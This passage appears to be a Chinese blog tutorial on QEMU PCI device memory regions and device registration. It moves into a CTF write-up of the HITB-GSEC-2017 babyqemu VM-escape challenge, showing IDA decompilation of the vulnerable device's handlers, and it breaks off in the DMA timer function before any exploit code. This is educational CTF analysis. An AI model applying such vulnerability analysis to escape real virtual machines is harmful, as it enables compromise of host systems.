title="PCI的内存空间"></a>PCI的内存空间</h2><p>qemu中使用<code>MemoryRegion</code>来标识内存空间(定义于<code>include/exec/memory/h</code>)。使用<code>MemoryRegionOps</code>结构体来定义对内存操作的一些内容。对于<code>MMIO</code>以及<code>PMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，在此结构体中我们可以定义对应的<code>read/write</code>回调函数</p><p><code>MemoryRegionOps</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> (*read)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="keyword">unsigned</span> size);</span><br><span class="line">    <span class="comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="keyword">void</span> (*write)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="keyword">uint64_t</span> data,</span><br><span class="line">                  <span class="keyword">unsigned</span> size);</span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="keyword">uint64_t</span> *data,</span><br><span class="line">                                   <span class="keyword">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="keyword">uint64_t</span> data,</span><br><span class="line">                                    <span class="keyword">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line">    <span class="keyword">enum</span> device_endian endianness;</span><br><span class="line">    <span class="comment">/* Guest可见约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> min_access_size;</span><br><span class="line">        <span class="keyword">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span></span><br><span class="line"><span class="comment">         * accesses throw machine checks.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="keyword">bool</span> unaligned;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若存在且 #false, 则该事务不会被设备所接受</span></span><br><span class="line"><span class="comment">         * (并导致机器的相关行为，例如机器检查异常).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">bool</span> (*accepts)(<span class="keyword">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="keyword">unsigned</span> size, <span class="keyword">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line">    <span class="comment">/* 内部应用约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最小的实现的 size .</span></span><br><span class="line"><span class="comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> min_access_size;</span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最大的实现的 size . </span></span><br><span class="line"><span class="comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* 若为 true, 支持非对齐的访问.  </span></span><br><span class="line"><span class="comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以定义对应的回调函数，以及一些其他属性等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以用<code>memory_region_init_io</code>函数初始化<code>MemoryRegion</code>结构体对应的内存空间，记录空间大小，注册<code>MMIO/PMIO</code>读写函数，然后可以通过<code>pci_register_bar</code>来注册BAR信息等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-mmio&quot;</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-portio&quot;</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure><h2 id="QEMU中PCI设备的编写"><a href="#QEMU中PCI设备的编写" class="headerlink" title="QEMU中PCI设备的编写"></a>QEMU中PCI设备的编写</h2><p>编写好之后在<code>/hw/misc/messon.build</code>下加入相应条目</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softmmu.ss(when: &#x27;&#x27;,if_ture:files(&#x27;&#x27;))</span><br></pre></td></tr></table></figure><p>然后在<code>/hw/misc/Kconfig</code>中添加相应条目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config XXX</span><br><span class="line">    <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">default</span> y <span class="keyword">if</span> PCI_DEVICES</span><br><span class="line">    depends on PCI</span><br></pre></td></tr></table></figure><p>编译QEMU后启动的时候加上<code>-device XXX</code>就能找到相应的PCI设备</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HITB-GSEC-2017-babyqemu"><a href="#HITB-GSEC-2017-babyqemu" class="headerlink" title="HITB-GSEC-2017-babyqemu"></a>HITB-GSEC-2017-babyqemu</h2><p>查看启动脚本，有个<code>-device hitb</code>，这个就是有漏洞的设备了。我们把qemu文件拖进IDA分析一会，然后字符串搜索<code>hitb</code>相关函数便能看到一些相关的函数</p><p><img src="https://s2.loli.net/2023/05/10/yhsSwgTzfMLHrW6.png" alt="image-20230510201011352"></p><p>我们可以分析一下一些函数的功能(这些函数的编写就是对应于前面的QOM模型)。需要注意的是，有时候IDA识别的结构体有问题，所以我们可以在本地类型里面搜到原本定义的结构体(这里是<code>HitbState</code>，其定义如下)，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> HitbState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1BD0</span>, align=<span class="number">0x10</span>, copyof_1494)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000009F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AF0 thread QemuThread_0 ?</span><br><span class="line"><span class="number">00000</span>AF8 thr_mutex QemuMutex_0 ?</span><br><span class="line"><span class="number">00000B</span>20 thr_cond QemuCond_0 ?</span><br><span class="line"><span class="number">00000B</span>50 stopping db ?</span><br><span class="line"><span class="number">00000B</span>51 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>52 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>53 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>54 addr4 dd ?</span><br><span class="line"><span class="number">00000B</span>58 fact dd ?</span><br><span class="line"><span class="number">00000B</span>5C status dd ?</span><br><span class="line"><span class="number">00000B</span>60 irq_status dd ?</span><br><span class="line"><span class="number">00000B</span>64 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>65 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>66 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>67 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>68 dma dma_state ?</span><br><span class="line"><span class="number">00000B</span>88 dma_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00000B</span>B8 dma_buf db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001B</span>B8 enc dq ?                                ; offset</span><br><span class="line"><span class="number">00001B</span>C0 dma_mask dq ?</span><br><span class="line"><span class="number">00001B</span>C8 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>C9 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CA db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CB db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CC db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CD db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CE db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CF db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>D0 HitbState ends</span><br></pre></td></tr></table></figure><p>然后使用<code>y</code>更改类型即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = (<span class="keyword">void</span> (*)(PCIDevice_0 *, Error_0 **))pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里定义了设备号，厂商号以及初始化函数以及exit对应的函数等等，我们看看这个初始化函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要比较重要的是注册了一些回调函数，设置了<code>&amp;pdev-&gt;dma_timer</code>的回调函数为<code>hitb_dma_timer</code> </p><p>还有<code>memory_region_init_io</code>这行初始化了MMIO，指定了读写的回调函数(<code>&amp;hitb_mmio_ops</code>)(这是一个类似于虚表的东西，里面放着MMIO_READ和MMIO_WRITE对应的函数指针)</p><p>  <img src="https://s2.loli.net/2023/05/10/yHx5Jh6M3OuURqY.png" alt="image-20230510201849692"></p><p>最后pci_register_bar语句就是将这个<code>&amp;pdev-&gt;mmio</code>注册到qemu PCI设备的BAR(就是之前说到的配置空间的那个BAR)。第二个参数0代表注册MMIO，1代表注册PMIO</p><p>还有初始化实例的这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_instance_init</span><span class="params">(Object_0 *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = (__int64)object_dynamic_cast_assert(</span><br><span class="line">                  obj,</span><br><span class="line">                  (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>,</span><br><span class="line">                  (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                  <span class="number">459</span>,</span><br><span class="line">                  <span class="string">&quot;hitb_instance_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">7104</span>) = <span class="number">0xFFFFFFF</span>LL;</span><br><span class="line">  v1 += <span class="number">7104L</span>L;</span><br><span class="line">  *(_QWORD *)(v1 - <span class="number">8</span>) = hitb_enc;</span><br><span class="line">  object_property_add(</span><br><span class="line">    obj,</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.server_bar2.coalesced.tqh_first + <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;uint64&quot;</span>,</span><br><span class="line">    hitb_obj_uint64,</span><br><span class="line">    hitb_obj_uint64,</span><br><span class="line">    <span class="number">0L</span>L,</span><br><span class="line">    (<span class="keyword">void</span> *)v1,</span><br><span class="line">    <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>HitbState-&gt;enc</code>函数指针初始化为<code>hitb_enc</code>(你问我为什么，注意到结构体HitbState的0x1BB8偏移处是enc指针，换算成十进制就是7096，如果把v1看作是指向HitbState结构体的指针的话正好是<code>*(v1+7104-8) = *(v1+7096)=hib_enc</code> 这里大概涉及到指针加减的操作，直接把v1改变类型识别得很难看</p><p>然后便是这个相应的READ和WRITE函数，可以看到并没有什么洞，因为主要是对HitbState这个结构体的成员进行一系列赋值而已</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">16777453L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有就是write，代码过长就不贴了，自己IDA上面可以看</p><p>我们可以注意到当MMIO_WRITE的时候会有如下分支，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该会调用<code>opaque-&gt;dma_timer</code>的回调函数<code>hitb_dma_timer</code> ，我们关注一下这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span 